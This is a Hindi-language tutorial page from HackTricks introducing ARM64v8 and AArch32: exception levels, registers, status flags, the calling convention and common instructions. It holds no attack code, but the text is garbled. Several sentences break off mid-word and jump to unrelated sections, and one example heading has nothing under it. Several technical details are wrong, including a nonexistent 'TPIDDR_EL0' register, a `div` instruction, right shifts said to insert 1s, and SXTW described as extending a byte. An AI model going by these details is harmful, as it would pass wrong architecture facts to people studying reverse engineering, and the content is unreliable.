# ARM64v8 का परिचय

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन **The PEASS Family** की खोज करें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) से या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## **अपवाद स्तर - EL (ARM64v8)**

ARMv8 आर्किटेक्चर में, अभिव्यक्ति स्तर, जिन्हें अपवाद स्तर (ELs) के रूप में जाना जाता है, निष्पादन वातावरण की विशेषाधिकार स्तर और क्षमताएँ परिभाषित करते हैं। चार अपवाद स्तर हैं, EL0 से EL3 तक, प्रत्येक एक विभिन्न उद्देश्य की सेवा करते हैं:

1. **EL0 - उपयोगकर्ता मोड**:
* यह सबसे कम विशेषाधिकृत स्तर है और सामान्य एप्लिकेशन कोड को निष्पादित करने के लिए उपयोग किया जाता है।
* EL0 पर चल रहे एप्लिकेशन एक-दूसरे से और सिस्टम सॉफ़्टवेयर से अलग होते हैं, जो सुरक्षा और स्थिरता को बढ़ावा देता है।
2. **EL1 - ऑपरेटिंग सिस्टम कर्नेल मोड**:
* अधिकांश ऑपरेटिंग सिस्टम कर्नेल इस स्तर पर चलते हैं।
* EL1 में EL0 से अधिक विशेषाधिकार होते हैं और सिस्टम संसाधनों तक पहुंच सकते हैं, लेकिन कुछ प्रतिबंध हैं ताकि सिस्टम अखंडता सुनिश्चित हो सके।
3. **EL2 - हाइपरवाइजर मोड**:
* यह स्तर वर्चुअलाइजेशन के लिए उपयोग किया जाता है। EL2 पर चल रहा हाइपरवाइजर एक ही भौतिक हार्डवेयर पर चल रहे कई ऑपरेटिंग सिस्टम (प्रत्येक अपने खुद के EL1 में) का प्रबंधन कर सकता है।
* EL2 वर्चुअलाइजेशनीय वातावरणों की अलगाव और नियंत्रण की सुविधाएँ प्रदान करता है।
4. **EL3 - सुरक्षित मॉनिटर मोड**:
* यह सबसे अधिक विशेषाधिकृत स्तर है और अक्सर सुरक्षित बूटिंग और विश्वसनीय निष्पादन वातावरणों के लिए उपयोग किया जाता है।
* EL3 सुरक्षित और गैर-सुरक्षित स्थितियों के बीच पहुंच और नियंत्रण का प्रबंधन कर सकता है (जैसे सुरक्षित बूट, विश्वसनीय ओएस, आदि)।

इन स्तरों का उपयोग विभिन्न पहलुओं को प्रबंधित करने के लिए एक संरचित और सुरक्षित तरीके पर अनुमति देता है, उपयोगकर्ता एप्लिकेशन से सबसे अधिक विशेषाधिकृत सिस्टम सॉफ़्टवेयर तक। ARMv8 का विशेषाधिकार स्तरों का दृष्टिकोण विभिन्न सिस्टम घटकों को प्रभावी ढंग से अलग करने में मदद करता है, जिससे सिस्टम की सुरक्षा और मजबूती में वृद्धि होती है।

## **रजिस्टर (ARM64v8)**

ARM64 में **31 सामान्य उद्देश्य रजिस्टर** हैं, `x0` से `x30` तक लेबल किए गए। प्रत्येक एक **64-बिट** (8-बाइट) मान स्टोर कर सकता है। 32-बिट मानों को आवश्यक करने वाले ऑपरेशनों के लिए, एक ही रजिस्टरों को 32-बिट मोड में एक्सेस किया जा सकता है जिसे नाम w0 से w30 तक दिया गया है।

1. **`x0`** से **`x7`** - इन्हें सामान्यत: स्क्रैच रजिस्टर्स के रूप में और सबरूटीन्स को पैरामीटर पास करने के लिए उपयोग किया जाता है।
* **`x0`** एक फ़ंक्शन के रिटर्न डेटा को भी लेता है
2. **`x8`** - लिनक्स कर्नेल में, `x8` `svc` इंस्ट्रक्शन के लिए सिस्टम कॉल नंबर के रूप में उपयोग किया जाता है। **macOS में x16 का उपयोग किया जाता है!**
3. **`x9`** से **`x15`** - अधिक सामान्य रजिस्टर, अक्सर स्थानीय चरों के लिए उपयोग किया जाता है।
4. **`x16`** और **`x17`** - **अंतर-प्रक्रियात्मक कॉल रजिस्टर**। तत्काल मूल्यों के लिए अस्थायी रजिस्टर। वे अंधक कार्यों और PLT (Procedure Linkage Table) स्टब्स के लिए भी उपयोग किए जाते हैं।
* **`x16`** **macOS** में **`svc`** इंस्ट्रक्शन के लिए **सिस्टम कॉल नंबर** के रूप में उपयोग किया जाता है।
5. **`x18`** - **प्लेटफ़ॉर्म रजिस्टर**। इसे एक सामान्य उद्देश्य रजिस्टर के रूप में उपयोग किया जा सकता है, लेकिन कुछ प्लेटफ़ॉर्मों पर, यह रजिस्टर प्लेटफ़ॉर्म-विशेष उपयोगों के लिए सुरक्षित किया जाता है: विंडोज में वर्तमान धागे पर पॉइंटर, या लिनक्स कर्नेल में वर्तमान **निष्पादित कार्य संरचना को पॉइंट करने के लिए**।
6. **`x19`** से **`x28`** - ये कॉली-सेव्ड रजिस्टर हैं। एक फ़ंक्शन को अपने कॉलर के लिए इन रजिस्टरों के मान को संरक्षित करना चाहिए, इसलिए वे स्टैक में स्टोर किए जाते हैं और कॉलर के पास जाने से पहले पुनः प्राप्त किए जाते हैं।
7. **`x29`** - **फ्रेम पॉइंटर** स्टैक फ्रेम का ट्रैक रखने के लिए। जब एक नया स्टैक फ्रेम बनाया जाता है क्योंकि एक फ़ंक्शन को कॉल किया जाता है, तो **`x29`** रजिस्टर को स्टैक में स्टोर किया जाता है और नया फ्रेम पॉइंटर पता (**`sp`** पता) इस रजिस्ट्री में स्टोर किया जाता है।
* यह रजिस्टर एक **सामान्य उद्देश्य रजिस्टर** के रूप में भी उपयोग किया जा सकता है हालांकि यह आम तौर पर स्थानीय चरों के संदर्भ के रूप में उपयोग किया जाता है।
8. **`x30`** या **`lr`**- **लिंक रजिस्टर**। जब एक `BL` (Branch with Link) या `BLR` (Branch with Link to Register) इंस
### प्रणाली रजिस्टर

**सैकड़ों प्रणाली रजिस्टर** होते हैं, जिन्हें विशेष उद्देश्य रजिस्टर (SPRs) भी कहा जाता है, जो **प्रोसेसर** के व्यवहार को **निगरानी** और **नियंत्रण** के लिए उपयोग किया जाता है।\
इन्हें केवल विशेष निर्दिष्ट निर्देशिका **`mrs`** और **`msr`** का उपयोग करके पढ़ा या सेट किया जा सकता है।

विशेष रजिस्टर **`TPIDR_EL0`** और **`TPIDDR_EL0`** जब रिवर्स इंजीनियरिंग किया जाता है, तो आमतौर पर पाया जाता है। `EL0` सूफ़िक्स इसका संकेत करता है कि रजिस्टर तक पहुंचा जा सकता है किसी **न्यूनतम अपवाद** से (इस मामले में EL0 सामान्य अपवाद (विशेषाधिकार) स्तर है जिसमें सामान्य कार्यक्रम चलते हैं)।\
इन्हें आमतौर पर **स्थानीय भंडारण क्षेत्र** के **आधार पता** को संग्रहित करने के लिए उपयोग किया जाता है। सामान्यत: पहला पढ़ने और लिखने के लिए उपयुक्त है, लेकिन दूसरा EL0 से पढ़ा जा सकता है और EL1 से लिखा जा सकता है (जैसे कर्नेल)।

* `mrs x0, TPIDR_EL0 ; TPIDR_EL0 को x0 में पढ़ें`
* `msr TPIDR_EL0, X0 ; x0 को TPIDR_EL0 में लिखें`

### **PSTATE**

**PSTATE** में कई प्रक्रिया घटक होते हैं जो ऑपरेटिंग-सिस्टम-दृश्य **`SPSR_ELx`** विशेष रजिस्टर में संग्रहीत होते हैं, जो ट्रिगर किए गए अपवाद के **अनुमति स्तर** X होता है (यह अपवाद समाप्त होने पर प्रक्रिया स्थिति को पुनर्प्राप्त करने की अनुमति देता है)।\
ये पहुंचने योग्य क्षेत्र हैं:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`** और **`V`** स्थिति ध्वज:
* **`N`** का अर्थ है कि ऑपरेशन नकारात्मक परिणाम दिया
* **`Z`** का अर्थ है कि ऑपरेशन शून्य परिणाम दिया
* **`C`** का अर्थ है कि ऑपरेशन ले जाया
* **`V`** का अर्थ है कि ऑपरेशन साइन ओवरफ्लो दिया:
* दो सकारात्मक संख्याओं का योगान्त एक नकारात्मक परिणाम देता है।
* दो नकारात्मक संख्याओं का योगान्त एक सकारात्मक परिणाम देता है।
* घटना घटना, जब एक बड़ी नकारात्मक संख्या से एक छोटी सकारात्मक संख्या को घटाया जाता है (या उल्टा), और परिणाम दिए गए बिट आकार की दी गई सीमा के भीतर प्रतिनिधित्व नहीं किया जा सकता है।
* स्वाभाविक रूप से प्रोसेसर को यह नहीं पता होता कि ऑपरेशन साइन है या नहीं, इसलिए यह C और V की जांच करेगा ऑपरेशन में और इसका संकेत देगा कि यदि एक कैरी हुई है तो उसका घटना हुई थी यदि यह साइन था या असाइन।

{% hint style="warning" %}
सभी निर्देशिकाएँ इन ध्वजों को अपडेट नहीं करती हैं। कुछ जैसे **`CMP`** या **`TST`** करते हैं, और अन्य जिनके पास एक s सूफ़िक्स है जैसे **`ADDS`** भी ऐसा करते हैं।
{% endhint %}

* वर्तमान **रजिस्टर चौड़ाई (`nRW`)** ध्वज: यदि ध्वज मान 0 में है, तो कार्यक्रम AArch64 अभिषेक स्थिति में चलेगा जब फिर से आरंभ होगा।
* वर्तमान **अपवाद स्तर** (**`EL`**): EL0 में चल रहे एक सामान्य कार्यक्रम का मान 0 होगा
* **एकल कदम ध्वज** (**`SS`**): डीबगर्स द्वारा एकल कदम चलाने के लिए उपयोग किया जाता है, एक अपवाद के माध्यम से **`SPSR_ELx`** में SS ध्वज को 1 सेट करके। कार्यक्रम एक कदम चलाएगा और एक एकल कदम अपवाद जारी करेगा।
* अवैध अपवाद स्थिति ध्वज (**`IL`**): यह उस समय चिह्नित करने के लिए उपयोग किया जाता है जब एक विशेषाधिकार सॉफ़्टवेयर एक अवैध अपवाद स्तर स्थानांतरण करता है, यह ध्वज 1 पर सेट किया जाता है और प्रोसेसर एक अवैध स्थिति अपवाद ट्रिगर करता है।
* **`DAIF`** ध्वज: ये ध्वज एक विशेषाधिकारी कार्यक्रम को विभिन्न बाह्य अपवादों को वैकल्पिक रूप से मास्क करने की अनुमति देते हैं।
* यदि **`A`** 1 है तो यह असमवर्ती अबॉर्ट्स को ट्रिगर करेगा। **`I`** बाह्य हार्डवेयर **इंटरप्ट अनुरोधों** (IRQs) का प्रतिक्रिया देने के लिए कॉन्फ़िगर करता है। और F **फास्ट इंटरप्ट अनुरोधों** (FIRs) से संबंधित है।
* **स्टैक प्वाइंटर सेलेक्ट** ध्वज (**`SPS`**): EL1 और इससे ऊपर चल रहे विशेषाधिकारी कार्यक्रम अपने स्टैक प्वाइंटर रजिस्टर और उपयोगकर्ता मॉडल वाले के बीच बदल सकते हैं (जैसे `SP_EL1` और `EL0` के बीच)। यह परिवर्तन EL0 से नहीं किया जा सकता।

## **कॉलिंग कनवेंशन (ARM64v8)**

ARM64 कॉलिंग कनवेंशन निर्दिष्ट करता है कि **पहले आठ पैरामीटर** एक फ़ंक्शन में **रजिस्टर्स `x0` से `x7`** में पारित किए जाते हैं। **अतिरिक्त** पैरामीटर **स्टैक** पर पारित किए जाते हैं। **वापसी** मान **रजिस्टर `x0`** में वापस पारित किया जाता है, या **यदि यह 128 बिट लंबा है** तो **`x1`** में भी। **`x19`** से **`x30`** और **`sp`** रजिस्टर को फ़ंक्शन कॉल के बीच संरक्षित रखना चाहिए।

एक फ़ंक्शन को असेंबली में पढ़ते समय, **फ़ंक्शन प्रोलॉग और एपिलॉग** के लिए देखें। **प्रोलॉग** आमतौर पर **फ्रेम पॉइंटर (`x29`) को बचाना**, **नया फ्रेम पॉइंटर सेट** करना, और **स्टैक स्थान आवंटित** करना शामिल होता है। **एपिलॉग** आमतौर पर **बचाया गया फ्रेम पॉइंटर को पुनर्स्थापित करना** और **फ़ंक्शन से वापस लौटना** शामिल होता है।

### स्विफ्ट में कॉलिंग कनवेंशन

स्विफ्ट का अपना **कॉलिंग कनवेंशन** होता है जो [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) में पाया जा सकता है।

## **सामान्य निर्देशिकाएँ (ARM64v8)**

ARM64 निर्देशिकाएँ सामान्यत: **`opcode dst, src1, src2`** प्रारूप रखती हैं, जहां **`opcode`** वह **ऑपरेशन** है जो किया जाना है (जैसे `add`, `sub`, `mov`,
* वाक्याकार: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> गंतव्य
* Xn2 -> ऑपरेंड 1
* Xn3 | #imm -> ऑपरेंड 2 (रजिस्टर या तत्काल)
* \[shift #N | RRX] -> शिफ्ट करें या RRX को कॉल करें
* उदाहरण: `add x0, x1, x2` — यह `x1` और `x2` में मानों को जोड़ता है और परिणाम को `x0` में संग्रहित करता है।
* `add x5, x5, #1, lsl #12` — यह 4096 के बराबर है (1 को 12 बार शिफ्ट करने पर) -> 1 0000 0000 0000 0000
* **`adds`** यह एक `add` करता है और झंडे को अपडेट करता है
* **`sub`**: दो रजिस्टरों के मानों को कम करें और परिणाम को एक रजिस्टर में संग्रहित करें।
* **`add`** की **सिंटेक्स** की जाँच करें।
* उदाहरण: `sub x0, x1, x2` — यह `x1` से `x2` का मान कम करता है और परिणाम को `x0` में संग्रहित करता है।
* **`subs`** यह `sub` की तरह है लेकिन झंडे को अपडेट करता है
* **`mul`**: दो रजिस्टरों के मानों को **गुणा** करें और परिणाम को एक रजिस्टर में संग्रहित करें।
* उदाहरण: `mul x0, x1, x2` — यह `x1` और `x2` में मानों को गुणा करता है और परिणाम को `x0` में संग्रहित करता है।
* **`div`**: एक रजिस्टर के मान को दूसरे से विभाजित करें और परिणाम को एक रजिस्टर में संग्रहित करें।
* उदाहरण: `div x0, x1, x2` — यह `x1` में मान को `x2` से विभाजित करता है और परिणाम को `x0` में संग्रहित करता है।
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **तार्किक शिफ्ट बाएं**: अंत से 0 जोड़ें और अन्य बिट्स को आगे ले जाएं (n बार 2 से गुणा)
* **तार्किक शिफ्ट दाएं**: शुरुआत में 1 जोड़ें और अन्य बिट्स को पिछले बार वापस ले जाएं (अप्रमाणित में n बार 2 से विभाजित)
* **अंकगणित शिफ्ट दाएं**: **`lsr`** की तरह, लेकिन यदि सबसे महत्वपूर्ण बिट 1 है, \*\*1s जोड़े जाते हैं (\*\*अंकगणित में n बार 2 से विभाजित)
* **दाएं घूमें**: **`lsr`** की तरह, लेकिन जो कुछ भी दाएं से हटाया जाता है, वह बाएं में जोड़ा जाता है
* **विस्तार के साथ दाएं घूमें**: **`ror`** की तरह, लेकिन कैरी झंड जैसा "सबसे महत्वपूर्ण बिट"। इसलिए कैरी झंड को बिट 31 में ले जाया जाता है और हटाए गए बिट को कैरी झंड में रखा जाता है।
* **`bfm`**: **बिट फाइल्ड मूव**, ये ऑपरेशन **एक मान से बिट `0...n`** की प्रतियां कॉपी करते हैं और उन्हें स्थानों **`m..m+n`** में रखते हैं। **`#s`** बाएं सबसे अधिक बिट स्थिति और **`#r`** दाएं घूमाने की मात्रा निर्दिष्ट करता है।
* बिटफाइल्ड मूव: `BFM Xd, Xn, #r`
* साइन बिटफील्ड मूव: `SBFM Xd, Xn, #r, #s`
* असाइन्ड बिटफील्ड मूव: `UBFM Xd, Xn, #r, #s`
* **बिटफील्ड निकालना और डालना:** एक रजिस्टर से एक बिटफील्ड की प्रतियां कॉपी करें और उसे दूसरे रजिस्टर में कॉपी करें।
* **`BFI X1, X2, #3, #4`** X1 में X2 से 3 वें बिट से 4 बिट डालें
* **`BFXIL X1, X2, #3, #4`** 3 वें बिट से X2 से चार बिट निकालें और उन्हें X1 में कॉपी करें
* **`SBFIZ X1, X2, #3, #4`** X2 से 4 बिटों का साइन-एक्सटेंड करें और उन्हें X1 में डालें जो बिट स्थिति 3 से शुरू होती है और दाएं बिटों को शून्य करते हैं
* **`SBFX X1, X2, #3, #4`** X2 से 3 वें बिट से 4 बिट निकालें, साइन एक्सटेंड करें, और परिणाम को X1 में रखें
* **`UBFIZ X1, X2, #3, #4`** X2 से 4 बिटों का जीरो-एक्सटेंड करें और उन्हें X1 में डालें जो बिट स्थिति 3 से शुरू होती है और दाएं बिटों को शून्य करते हैं
* **`UBFX X1, X2, #3, #4`** X2 से 3 वें बिट से 4 बिट निकालें और उन्हें X1 में जीरो-एक्सटेंड रिजल्ट में रखें।
* **चिह्न विस्तार करें तक X:** एक मान का साइन विस्तार करता है (या केवल 0 जोड़ता है असाइन्ड संस्करण में) उसके साथ ऑपरेशन करने के लिए:
* **`SXTB X1, W2`** W2 से X1 तक एक बाइट के साइन को विस्तारित करता है (`W2` `X2` का आधा है) 64 बिट भरने के लिए
* **`SXTH X1, W2`** W2 से X1 तक 16 बिट नंबर का साइन विस्तार करता है 64 बिट भरने के लिए
* **`SXTW X1, W2`** W2 से X1 तक एक बाइट के साइन को विस्तारित करता है 64 बिट भरने के लिए
* **`UXTB X1, W2`** एक बाइट को जोड़ता है 0s (असाइन्ड) W2 से X1 तक 64 बिट भरने के लिए
* **`extr`:** निर्दिष्ट **जोड़े गए जोड़ों** से बिट निकालता है।
* उदाहरण: `EXTR W3, W2, W1, #3` यह **W1+W2** को **W2 के 3 वें बिट से W1 के 3 वें बिट तक** लेता है और इसे W3 में संग्रहित करता है।
* **`cmp`**: दो रजिस्टरों की तुलना करें और स्थिति झंडे सेट करें। यह एक **`subs`** का **उपनाम** है जो गंतव्य रजिस्टर को शून्य रजिस्टर पर सेट करता है। `m == n` के बारे में जानने के लिए उपयुक्त है।
* यह **`subs`** के समान सिंटेक्स का समर्थन करता है
* उदाहरण: `cmp x0, x1` — यह `x0` और `x1` में मानों की तुलना करता है और अनुसार शर्त झंडे सेट करता है।
* **`cmn`**: **गणना नकारात्मक** ऑपरेंड। इस मामले में यह **`adds`** का उपनाम है और एक ही सिंटेक्स का समर्थन करता है। `m == -n` के बारे में जानने के लिए उपयुक्त है।
* **`ccmp`**: शर्तमय तुलना, यह तुलना केवल तब की जाएगी जब पिछली तुलना सच थी और विशेष रूप से nzcv बिट्स सेट किए जाएंगे।
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> यदि x1 != x2 और x3 < x4, _func पर जाएं
* यह इसलिए है क्योंकि **`ccmp`** केवल उस समय निष्पादित किया जाएगा जब **पिछली `cmp` एक `NE` था**, अगर नहीं था तो बिट्स `nzcv` को 0 पर सेट किया जाएगा (जो `blt` तुलना को संतोषप्रद नहीं करेगा)।
* इसे `ccmn` के रूप में भी उपयोग किया जा सकता है (वही लेकिन नकारात्मक, जैसे `cmp` vs `cmn`।)
* **`tst`**: यह जांचता है कि क्या
* **`b.ne`**: **ब्रांच अगर बराबर नहीं**। यह निर्धारित शर्तों की जांच करता है (जो पिछले तुलना निर्देशन द्वारा सेट किए गए थे), और यदि तुलना की गई मान समान नहीं थे, तो यह एक लेबल या पते पर ब्रांच करता है।
* उदाहरण: `cmp x0, x1` निर्देशन के बाद, `b.ne label` — यदि `x0` और `x1` में मान समान नहीं थे, तो यह `label` पर जाता है।
* **`cbz`**: **जीरो पर तुलना और ब्रांच**। यह निर्देशन एक रजिस्टर को शून्य के साथ तुलना करता है, और यदि वे समान हैं, तो यह एक लेबल या पते पर ब्रांच करता है।
* उदाहरण: `cbz x0, label` — यदि `x0` में मान शून्य है, तो यह `label` पर जाता है।
* **`cbnz`**: **जीरो पर तुलना और ब्रांच**। यह निर्देशन एक रजिस्टर को शून्य के साथ तुलना करता है, और यदि वे समान नहीं हैं, तो यह एक लेबल या पते पर ब्रांच करता है।
* उदाहरण: `cbnz x0, label` — यदि `x0` में मान गैर-शून्य है, तो यह `label` पर जाता है।
* **`tbnz`**: बिट की जांच और गैर-शून्य पर ब्रांच
* उदाहरण: `tbnz x0, #8, label`
* **`tbz`**: बिट की जांच और शून्य पर ब्रांच
* उदाहरण: `tbz x0, #8, label`
* **शर्तमय चयन कार्याएँ**: ये कार्याएँ वे ऑपरेशन हैं जिनका व्यवहार शर्तमय बिट्स पर निर्भर करता है।
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> यदि सत्य, X0 = X1, अगर झूठ, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> यदि सत्य, Xd = Xn, अगर झूठ, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> यदि सत्य, Xd = Xn + 1, अगर झूठ, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> यदि सत्य, Xd = Xn, अगर झूठ, Xd = NOT(Xm)
* `cinv Xd, Xn, cond` -> यदि सत्य, Xd = NOT(Xn), अगर झूठ, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> यदि सत्य, Xd = Xn, अगर झूठ, Xd = - Xm
* `cneg Xd, Xn, cond` -> यदि सत्य, Xd = - Xn, अगर झूठ, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> यदि सत्य, Xd = 1, अगर झूठ, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> यदि सत्य, Xd = \<all 1>, अगर झूठ, Xd = 0
* **`adrp`**: **एक प्रतीक का पृष्ठ पता** गणना और इसे एक रजिस्टर में संग्रहीत करना।
* उदाहरण: `adrp x0, symbol` — यह `symbol` का पृष्ठ पता गणना करता है और इसे `x0` में संग्रहीत करता है।
* **`ldrsw`**: मेमोरी से एक साइन एक्सटेंडेड 64 बिट तक का साइन्ड **32-बिट** मान **लोड** करें।
* उदाहरण: `ldrsw x0, [x1]` — यह `x1` द्वारा संकेतित मेमोरी स्थान से एक साइन्ड 32-बिट मान लोड करता है, इसे 64 बिट तक साइन एक्सटेंड करता है, और इसे `x0` में संग्रहीत करता है।
* **`stur`**: **एक रजिस्टर मान को एक मेमोरी स्थान पर स्टोर करें**, एक अन्य रजिस्टर से एक ऑफसेट का उपयोग करके।
* उदाहरण: `stur x0, [x1, #4]` — यह `x1` में वर्तमान मेमोरी पते से 4 बाइट अधिक होने वाले पते में मौजूद मान को स्टोर करता है।
* **`svc`** : **सिस्टम कॉल** करें। यह "सुपरवाइजर कॉल" के लिए खड़ा है। जब प्रोसेसर इस निर्देश को निष्पादित करता है, तो यह **उपयोगकर्ता मोड से कर्णेल मोड** में स्विच करता है और मेमोरी में एक विशिष्ट स्थान पर जाता है जहां **कर्णेल की सिस्टम कॉल हैंडलिंग** कोड स्थित है।
*   उदाहरण:

```armasm
mov x8, 93  ; निकास (93) के लिए सिस्टम कॉल नंबर को रजिस्टर x8 में लोड करें।
mov x0, 0   ; निकास स्थिति कोड (0) को रजिस्टर x0 में लोड करें।
svc 0       ; सिस्टम कॉल करें।
```

### **कार्य का प्रोलॉग**

1. **लिंक रजिस्टर और फ्रेम प्वाइंटर को स्टैक में सहेजें**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **नए फ्रेम पॉइंटर सेट करें**: `mov x29, sp` (वर्तमान फ़ंक्शन के लिए नए फ्रेम पॉइंटर सेट करता है)
3. **स्थानीय चरों के लिए स्टैक पर स्थान आवंटित करें** (यदि आवश्यक हो): `sub sp, sp, <size>` (जहां `<size>` आवश्यक बाइट्स की संख्या है)

### **फ़ंक्शन एपिलॉग**

1. **स्थानीय चरों को डीएलीक्वेट करें (यदि कोई आवंटित किए गए हों)**: `add sp, sp, <size>`
2. **लिंक रजिस्टर और फ्रेम पॉइंटर को पुनर्स्थापित करें**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret` (नियंत्रण को वापस कॉलर के पते का उपयोग करके वापस देता है)

## AARCH32 क्रियान्वयन स्थिति

Armv8-A 32-बिट कार्यक्रमों का क्रियान्वयन समर्थन करता है। **AArch32** एक में चल सकता है **दो निर्देश सेटों** में: **`A32`** और **`T32`** और उनके बीच **`इंटरवर्किंग`** के माध्यम से स्विच कर सकता है।\
**विशेषाधिकारी** 64-बिट कार्यक्रम 32-बिट कार्यक्रमों का क्रियान्वयन कर सकते हैं एक अपेक्षा स्तर स्थानांतरण का क्रियान्वयन करके निम्न विशेषाधिकारी 32-बिट में।\
ध्यान दें कि 64-बिट से 32-बिट में स्थानांतरण एक अपेक्षा स्तर कम के साथ होता है (उदाहरण के लिए एल1 में एक 64-बिट कार्यक्रम एल0 में एक कार्यक्रम को ट्रिगर करना)। यह किया जाता है **`SPSR_ELx`** विशेष रजिस्टर के **बिट 4 को** **1** पर सेट करके जब `AArch32` प्रक्रिया धागा क्रियान्वित होने के लिए तैयार होता है और बाकी `SPSR_ELx` में **`AArch32`** कार्यक्रम CPSR को संग्रहीत करता है। फिर, विशेषाधिकारी प्रक्रिया **`ERET`** निर्देश को कॉल करती है ताकि प्रोसेसर **`AArch32`** में स्थानांतरित हो जाए A32 या T32 में प्रवेश करते हैं CPSR के आधार पर\*\*.\*\*

**`इंटरवर्किंग`** J और T बिट्स का उपयोग करके होता है। `J=0` और `T=0` का मतलब है **`A32`** और `J=0` और `T=1` का मतलब है **T32**। यह मूल रूप से निर्देश सेट T32 है इसका संकेत देने के लिए **निचले बिट को 1 पर सेट करना** है।\
यह **इंटरवर्किंग शाखा निर्देशों** के दौरान सेट किया जाता है, लेकिन PC को गंतव्य रजिस्टर के रूप में सेट किया जा सकता है अन्य निर्देशों के साथ सीधे सेट किया जा सकता है। उदाहरण: 

एक और उदाहरण:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### रजिस्टर

16 32-बिट रजिस्टर हैं (r0-r15). **r0 से r14** तक इन्हें **किसी भी ऑपरेशन** के लिए उपयोग किया जा सकता है, हालांकि कुछ रिजर्व्ड होते हैं:

* **`r15`**: कार्यक्रम काउंटर (हमेशा). अगले निर्देश का पता रखता है। A32 में current + 8, T32 में, current + 4।
* **`r11`**: फ्रेम पॉइंटर
* **`r12`**: इंट्रा-प्रोसेडर कॉल रजिस्टर
* **`r13`**: स्टैक पॉइंटर
* **`r14`**: लिंक रजिस्टर

इसके अतिरिक्त, रजिस्टर **`बैंक्ड रजिस्ट्रीज`** में बैकअप होते हैं। ये जगह हैं जो रजिस्टर मानों को संग्रहीत करती हैं जो अपशिष्ट हैं और विशेषाधिकारीय कार्यों में त्वरित संदर्भ परिवर्तन करने की अनुमति देती हैं ताकि हर बार रजिस्टर सहेजने और पुनर्स्थापित करने की आवश्यकता न हो।\
यह **`CPSR` से `SPSR`** में प्रोसेसर मोड की प्रक्रिया को सहेजने के लिए किया जाता है जिसे अपशिष्ट लिया जाता है। अपशिष्ट वापसी पर, **`CPSR`** को **`SPSR`** से पुनर्स्थापित किया जाता है।

### CPSR - वर्तमान कार्यक्रम स्थिति रजिस्टर

AArch32 में CPSR AArch64 में **`PSTATE`** के रूप में काम करता है और जब एक अपशिष्ट लिया जाता है तो यह बाद में पुनर्स्थापित करने के लिए **`SPSR_ELx`** में संग्रहीत होता है:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

क्षेत्रों को कुछ समूहों में विभाजित किया गया है:

* एप्लिकेशन प्रोग्राम स्थिति रजिस्टर (APSR): अंकगणित ध्वज और EL0 से एक्सेस किया जा सकता है
* क्रियान्वयन स्थिति रजिस्टर: प्रक्रिया व्यवहार (ओएस द्वारा प्रबंधित)।

#### एप्लिकेशन प्रोग्राम स्थिति रजिस्टर (APSR)

* **`N`**, **`Z`**, **`C`**, **`V`** ध्वज (जैसे AArch64 में)
* **`Q`** ध्वज: यह 1 पर सेट होता है जब कभी **इंटीजर सैचरेशन होता है** विशेषित सैचरेटिंग अंकगणित निर्देश के क्रियान्वयन के दौरान। एक बार यह **`1`** पर सेट हो जाता है, तो यह मान को बनाए रखेगा जब तक यह मैन्युअल रूप से 0 पर सेट नहीं होता है। इसके अतिरिक्त, इसके मान की जांच करने के लिए कोई निर्देश नहीं है, यह मान्यता से पढ़कर किया जाना चाहिए।
* **`GE`** (अधिक या बराबर) ध्वज: इसका उपयोग SIMD (Single Instruction, Multiple Data) ऑपरेशन में किया जाता है, जैसे "पैरलल जोड़" और "पैरलल कम"। ये ऑपरेशन एक ही निर्देश में कई डेटा बिंदुओं को प्रोसेस करने की अनुमति देते हैं।

उदाहरण के लिए, **`UADD8`** निर्देशन **चार जोड़ों को जोड़ता है** (दो 32-बिट ऑपरेंड से बाइटों के) पैरलल और परिणामों को एक 32-बिट रजिस्टर में संग्रहीत करता है। फिर यह इन परिणामों के आधार पर **`APSR`** में `GE` ध्वज सेट करता है। प्रत्येक GE ध्वज एक बाइट जोड़ने के लिए होता है, जिससे यह सूचित करता है कि उस बाइट जोड़ने के लिए अतिरिक्त हो गया है।

**`SEL`** निर्देशन इन GE ध्वजों का उपयोग शर्तानुसार क्रियाएँ करने के लिए करता है।

#### क्रियान्वयन स्थिति रजिस्टर

